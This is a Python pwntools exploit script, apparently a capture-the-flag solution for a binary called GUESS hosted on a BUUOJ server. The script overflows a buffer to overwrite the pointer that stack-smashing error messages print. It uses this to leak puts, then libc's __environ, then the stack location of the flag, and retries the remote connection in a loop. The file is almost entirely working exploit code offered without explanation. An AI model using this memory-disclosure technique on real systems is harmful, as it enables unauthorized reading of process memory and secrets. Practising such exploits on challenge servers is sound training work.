#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.02 17.25.27
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
from LibcSearcher import*
context.arch = 'amd64'


host = '1.1.1.1'
port = 10000
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('./GUESS')
	sh = process('./GUESS')
else:
	context.log_level = 'debug'
	libc=ELF('./libc.so.6')
	elf = ELF('./GUESS')
	sh = remote('node3.buuoj.cn',27633)



def pwn():
	payload = 'A'*0x128 + p64(elf.got['puts'])
	sh.sendlineafter('guessing flag\n',payload)
	sh.recvuntil("***: ")
	puts_addr = u64(sh.recvuntil('\x7f').ljust(8,'\x00'))
	# libc_s = LibcSearcher('puts',puts_addr)
	# libc_addr = puts_addr - libc_s.dump('puts')
	libc_addr = puts_addr - libc.sym['puts']
	environ = libc_addr + libc.sym['__environ']
	# environ = libc_addr - libc_s.dump('__environ')

	payload = 'A'*0x128 + p64(environ)
	# sh.recv()
	sh.recvline()
	sh.sendlineafter('Please type your guessing flag\n',payload)
	# pause()
	tmp = sh.recvuntil("***: ",timeout=0.1)
	if "***: " in tmp:
		pass
	else:
		sh.close()

	stack_addr = u64(sh.recvuntil('\x7f',timeout=0.1).ljust(8,'\x00'))
	if stack_addr > 0x7f0000000000:
		pass
	else:
		sh.close()
	buf_addr = stack_addr - 0xf8 - 0x70
	success(hex(stack_addr))

	payload = 'A'*0x128 + p64(buf_addr)
	sh.sendlineafter('guessing flag',payload)
	sh.recvuntil("***: ")
	flag = sh.recv()
	success(flag)
#
	# gdb.attach(sh)



if __name__ == '__main__':
	while 1:
		try:
			sh = remote('node3.buuoj.cn',27633)
			pwn()
			sh.interactive()
		except:
			sh.close()
	

